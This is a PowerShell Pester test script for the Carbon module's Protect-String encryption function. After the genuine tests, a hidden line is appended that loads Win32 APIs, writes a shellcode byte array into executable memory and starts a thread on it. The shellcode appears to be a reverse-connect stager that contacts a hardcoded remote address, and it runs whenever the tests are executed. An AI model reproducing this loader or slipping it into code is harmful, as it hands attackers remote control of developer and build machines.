











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$publicKeyFilePath = Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\CarbonTestPublicKey.cer' -Resolve
$privateKeyFilePath = Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\CarbonTestPrivateKey.pfx' -Resolve
$dsaKeyPath = Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\CarbonTestDsaKey.cer' -Resolve

Describe 'Protect-String' {

    BeforeEach {
        $Global:Error.Clear()
    }
        
    function Assert-IsBase64EncodedString($String)
    {
        $String | Should Not BeNullOrEmpty 'Didn''t encrypt cipher text.'
        { [Convert]::FromBase64String( $String ) } | Should Not Throw
    }
    
    It 'should protect string' {
        $cipherText = Protect-String -String 'Hello World!' -ForUser
        Assert-IsBase64EncodedString( $cipherText )
    }
    
    It 'should protect string with scope' {
        $user = Protect-String -String 'Hello World' -ForUser 
        $machine = Protect-String -String 'Hello World' -ForComputer
        $machine | Should -Not -Be $user -Because 'encrypting at different scopes resulted in the same string'
    }
    
    It 'should protect strings in pipeline' {
        $secrets = @('Foo','Fizz','Buzz','Bar') | Protect-String -ForUser
        $secrets.Length | Should Be 4 'Didn''t encrypt all items in the pipeline.'
        foreach( $secret in $secrets )
        {
            Assert-IsBase64EncodedString $secret
        }
    }
    
    if( -not (Test-Path -Path 'env:CCNetArtifactDirectory') )
    {
        It 'should protect string for credential' {
            
            $string = ' f u b a r '' " > ~!@
            $protectedString = Protect-String -String $string -Credential $CarbonTestUser
            $protectedString | Should Not BeNullOrEmpty ('Failed to protect a string as user {0}.' -f $CarbonTestUser.UserName)
    
            $decrypedString = Invoke-PowerShell -FilePath (Join-Path -Path $PSScriptRoot -ChildPath 'Cryptography\Unprotect-String.ps1') `
                                                -ArgumentList '-ProtectedString',$protectedString `
                                                -Credential $CarbonTestUser
            $decrypedString | Should Be $string
        }

        It 'should handle spaces in path to Carbon' {
            $tempDir = New-TempDirectory -Prefix 'Carbon Program Files'
            try
            {
                $junctionPath = Join-Path -Path $tempDir -ChildPath 'Carbon'
                Install-Junction -Link $junctionPath -Target (Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon' -Resolve)
                try
                {
                    Remove-Module 'Carbon'
                    Import-Module $junctionPath
                    try
                    {
                        $ciphertext = Protect-String -String 'fubar' -Credential $CarbonTestUser
                        $Global:Error.Count | Should Be 0
                        Assert-IsBase64EncodedString $ciphertext
                    }
                    finally
                    {
                        Remove-Module 'Carbon'
                        & (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)
                    }
                }
                finally
                {
                    Uninstall-Junction -Path $junctionPath
                }
            }
            finally
            {
                Remove-Item -Path $tempDir -Recurse -Force
            }
        }
    }
    else
    {
        Write-Warning ('Can''t test protecting string under another identity: running under CC.Net, and the service user''s profile isn''t loaded, so can''t use Microsoft''s DPAPI.')
    }
    
    It 'should encrypt with certificate' {
        $cert = Get-Certificate -Path $publicKeyFilePath
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString()
        $ciphertext = Protect-String -String $secret -Certificate $cert
        $ciphertext | Should Not BeNullOrEmpty
        $ciphertext | Should Not Be $secret
        $privateKey = Get-Certificate -Path $privateKeyFilePath
        (Unprotect-String -ProtectedString $ciphertext -Certificate $privateKey) | Should Be $secret
    }
    
    It 'should handle not getting an rsa certificate' {
        $cert = Get-Certificate -Path $dsaKeyPath
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString()
        $ciphertext = Protect-String -String $secret -Certificate $cert -ErrorAction SilentlyContinue
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'not an RSA key'
        $ciphertext | Should BeNullOrEmpty
    }
    
    It 'should reject strings that are too long for rsa key' {
        $cert = Get-Certificate -Path $privateKeyFilePath
        $secret = 'f' * 470
        $ciphertext = Protect-String -String $secret -Certificate $cert
        $Global:Error.Count | Should Be 0
        $ciphertext | Should Not BeNullOrEmpty
        (Unprotect-String -ProtectedString $ciphertext -Certificate $cert) | Should Be $secret
    
        $secret = 'f' * 472
        $ciphertext = Protect-String -String $secret -Certificate $cert -ErrorAction SilentlyContinue
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'String is longer'
        $ciphertext | Should BeNullOrEmpty
    }
    
    It 'should encrypt from cert store by thumbprint' {
        $cert = Get-ChildItem -Path cert:\* -Recurse |
                    Where-Object { $_ | Get-Member 'PublicKey' } |
                    Where-Object { $_.PublicKey.Key -is [Security.Cryptography.RSACryptoServiceProvider] } |
                    Select-Object -First 1
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString().Substring(0,20)
        $expectedCipherText = Protect-String -String $secret -Thumbprint $cert.Thumbprint
        $expectedCipherText | Should Not BeNullOrEmpty
    }
    
    It 'should handle thumbprint not in store' {
       $ciphertext = Protect-String -String 'fubar' -Thumbprint '1111111111111111111111111111111111111111' -ErrorAction SilentlyContinue
       $Global:Error.Count | Should BeGreaterThan 0
       $Global:Error[0] | Should Match 'not found'
       $ciphertext | Should BeNullOrEmpty
    }
    
    It 'should encrypt from cert store by cert path' {
        $cert = Get-ChildItem -Path cert:\* -Recurse |
                    Where-Object { $_ | Get-Member 'PublicKey' } |
                    Where-Object { $_.PublicKey.Key -is [Security.Cryptography.RSACryptoServiceProvider] } |
                    Select-Object -First 1
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString().Substring(0,20)
        $certPath = Join-Path -Path 'cert:\' -ChildPath (Split-Path -NoQualifier -Path $cert.PSPath)
        $expectedCipherText = Protect-String -String $secret -PublicKeyPath $certPath
        $expectedCipherText | Should Not BeNullOrEmpty
    }
    
    It 'should handle path not found' {
        $ciphertext = Protect-String -String 'fubar' -PublicKeyPath 'cert:\currentuser\fubar' -ErrorAction SilentlyContinue
        $Global:Error.Count | Should BeGreaterThan 0
        $Global:Error[0] | Should Match 'not found'
        $ciphertext | Should BeNullOrEmpty
    }
    
    It 'should encrypt from certificate file' {
        $cert = Get-Certificate -Path $publicKeyFilePath
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString()
        $ciphertext = Protect-String -String $secret -PublicKeyPath $publicKeyFilePath
        $ciphertext | Should Not BeNullOrEmpty
        $ciphertext | Should Not Be $secret
        $privateKey = Get-Certificate -Path $privateKeyFilePath 
        (Unprotect-String -ProtectedString $ciphertext -Certificate $privateKey) | Should Be $secret
    }
    
    It 'should encrypt a secure string' {
        $cert = Get-Certificate -Path $publicKeyFilePath
        $cert | Should Not BeNullOrEmpty
        $password = 'waffles'
        $secret = New-Object -TypeName System.Security.SecureString
        $password.ToCharArray() | ForEach-Object { $secret.AppendChar($_) }

        $ciphertext = Protect-String -String $secret -PublicKeyPath $publicKeyFilePath
        $ciphertext | Should Not BeNullOrEmpty
        $ciphertext | Should Not Be $secret
        $privateKey = Get-Certificate -Path $privateKeyFilePath 
        $decryptedPassword = Unprotect-String -ProtectedString $ciphertext -Certificate $privateKey
        $decryptedPassword | Should Be $password
        $passwordBytes = [Text.Encoding]::UTF8.GetBytes($password)
        $decryptedBytes = [Text.Encoding]::UTF8.GetBytes($decryptedPassword)
        $decryptedBytes.Length | Should Be $passwordBytes.Length
        for( $idx = 0; $idx -lt $passwordBytes.Length; ++$idx )
        {
            $passwordBytes[$idx] | Should Be $decryptedPassword[$idx]
        }
    }

    It 'should convert passed objects to string' {
        $cert = Get-Certificate -Path $publicKeyFilePath
        $cert | Should Not BeNullOrEmpty
        $input = New-Object -TypeName Carbon.Security.SecureStringConverter
        $cipherText = Protect-String -String $input -PublicKeyPath $publicKeyFilePath
        $cipherText | Should Not BeNullOrEmpty
        $cipherText | Should Not Be $input
        $privateKey = Get-Certificate -Path $privateKeyFilePath
        Assert-IsBase64EncodedString( $cipherText )
        (Unprotect-String -ProtectedString $cipherText -Certificate $privateKey) | Should Be $input.ToString()
    }

    It 'should encrypt from certificate file with relative path' {
        $cert = Get-Certificate -Path $publicKeyFilePath
        $cert | Should Not BeNullOrEmpty
        $secret = [Guid]::NewGuid().ToString()
        $ciphertext = Protect-String -String $secret -PublicKeyPath (Resolve-Path -Path $publicKeyFilePath -Relative)
        $ciphertext | Should Not BeNullOrEmpty
        $ciphertext | Should Not Be $secret
        $privateKey = Get-Certificate -Path $privateKeyFilePath
        (Unprotect-String -ProtectedString $ciphertext -Certificate $privateKey) | Should Be $secret
    }
    
    It 'should use direct encryption padding switch' {
        $secret = [Guid]::NewGuid().ToString()
        $ciphertext = Protect-String -String $secret -PublicKeyPath $publicKeyFilePath -UseDirectEncryptionPadding
        $ciphertext | Should Not BeNullOrEmpty
        $ciphertext | Should Not Be $secret
        $revealedSecret = Unprotect-String -ProtectedString $ciphertext -PrivateKeyPath $privateKeyFilePath -UseDirectEncryptionPadding
        $revealedSecret | Should Be $secret
    }

}

foreach( $keySize in @( 128, 192, 256 ) )
{
    Describe ('Protect-String when given a {0}-bit key' -f $keySize) {
        $Global:Error.Clear()
        
        $secret = [Guid]::NewGuid().ToString() * 20
        $guid = [Guid]::NewGuid()
        $passphrase = $guid.ToString().Substring(0,($keySize / 8))
        $keyBytes = [Text.Encoding]::UTF8.GetBytes($passphrase)
        $keySecureString = New-Object -TypeName 'Security.SecureString'
        foreach( $char in $passphrase.ToCharArray() )
        {
            $keySecureString.AppendChar($char)
        }

        foreach( $key in @( $passphrase,$keyBytes,$keySecureString) )
        {
            Context ('key as {0}' -f $key.GetType().FullName) {
                $ciphertext = Protect-String -String $secret -Key $key
                It 'should return ciphertext' {
                    $ciphertext | Should Not BeNullOrEmpty
                    ConvertFrom-Base64 -Value $ciphertext | Should Not BeNullOrEmpty
                    $Global:Error.Count | Should Be 0
                }

                It 'should encrypt ciphertext' {
                    $revealedSecret = Unprotect-String -ProtectedString $ciphertext -Key $key
                    $revealedSecret | Should Be $secret
                }
            }
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x98,0xa1,0x65,0x68,0x02,0x00,0x25,0xde,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

